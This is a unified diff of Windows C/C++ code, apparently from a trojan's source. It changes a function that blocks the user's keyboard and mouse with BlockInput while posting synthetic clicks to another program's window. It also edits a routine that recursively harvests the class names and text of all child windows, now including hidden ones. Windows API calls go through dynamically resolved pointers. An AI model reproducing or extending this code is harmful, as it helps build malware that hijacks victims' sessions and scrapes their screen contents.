@@ -281,8 +281,7 @@ bool HardClickToWindow( HWND wnd, int x, int y )
     {
 		pAttachThreadInput( curThreadID, TID, TRUE );
 
-		#ifndef __DEBUG
-
+		#ifndef _DEBUG
 			pBlockInput(TRUE);
 			pPostMessageA( wnd, WM_LBUTTONDOWN, MK_LBUTTON, MAKELPARAM(x,y) );
 			pWaitForInputIdle( proc, INFINITE );
@@ -320,26 +319,23 @@ BOOL WINAPI __DoGetWindowText(HWND Wnd, LPARAM Data)
 	static const char TextPerfix[]  = {'[', 'T','E','X','T',':',' ', 0};
 
 
-	if (D->Level == 0 || (BOOL)pIsWindowVisible(Wnd))
-	{
-		PCHAR Class = GetWndClassName(Wnd);
-		PCHAR Text = GetWndText(Wnd);
+	PCHAR Class = GetWndClassName(Wnd);
+	PCHAR Text = GetWndText(Wnd);
 
 
-		PCHAR Pref = STR::Alloc(D->Level*5);
-		m_memset(Pref, ' ', D->Level*5);
+	PCHAR Pref = STR::Alloc(D->Level*5);
+	m_memset(Pref, ' ', D->Level*5);
 
-		PCHAR S = STR::New(7, Pref, ClassPrefix, Class, "]  ", TextPerfix,  Text, "]");
+	PCHAR S = STR::New(7, Pref, ClassPrefix, Class, "]  ", TextPerfix,  Text, "]");
 
-		Strings::Add(D->Captions, S, false);
+	Strings::Add(D->Captions, S, false);
 
-		STR::Free(Text);
-		STR::Free(Class);
+	STR::Free(Text);
+	STR::Free(Class);
 
-		D->Level++;
-		pEnumChildWindows(Wnd, __DoGetWindowText, Data);
-		D->Level--;
-    }
+	D->Level++;
+	pEnumChildWindows(Wnd, __DoGetWindowText, Data);
+	D->Level--;
 
 	return TRUE;
 }
@@ -356,7 +352,7 @@ PCHAR GetAllWindowsText(HWND Wnd, bool AddClass, bool AddText)
 
 	PCHAR S = Strings::GetText(Info.Captions);
 
-	Strings::Free(Info.Captions);
+ 	Strings::Free(Info.Captions);
 
 	return S;
 }
